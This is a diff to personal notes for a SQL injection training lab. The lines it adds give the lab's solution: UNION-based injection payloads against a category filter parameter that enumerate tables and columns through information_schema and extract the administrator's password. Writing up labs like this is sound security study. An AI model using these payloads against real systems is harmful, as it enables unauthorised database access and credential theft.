@@ -55,7 +55,7 @@ Lab5: SQL injection attack, listing the database contents on non-Oracle database
 
 Given : DB contains a table that holds usernames and passwords columns .
 
-Q.      You need to determine the name of this table 
+Q.      You need to determine the name of this table  & pASSWORD OF administrator
 
 Ans  : GET /filter?category='
        GET /filter?category='--+
@@ -80,4 +80,16 @@ Ans  : GET /filter?category='
 
      - Find Table Name : Pgsql
 
-      ' union select table_name,'ABC' from 
+      ' union select table_name,'ABC' from information_schema.tables --+
+
+        Ans : users_onouxe,pg_user
+
+     - Find columns :Pgsql
+
+      ' UNION SELECT column_name, 'ABC' FROM information_schema.columns WHERE table_name='pg_user' --+
+      ' UNION SELECT column_name, 'ABC' FROM information_schema.columns WHERE table_name='users_onouxe'--+
+
+
+    - Find Password OF  administrator : 
+
+      ' UNION SELECT password_rqmxso , 'ABC' FROM users_onouxe WHERE username_funlze='administrator' --+
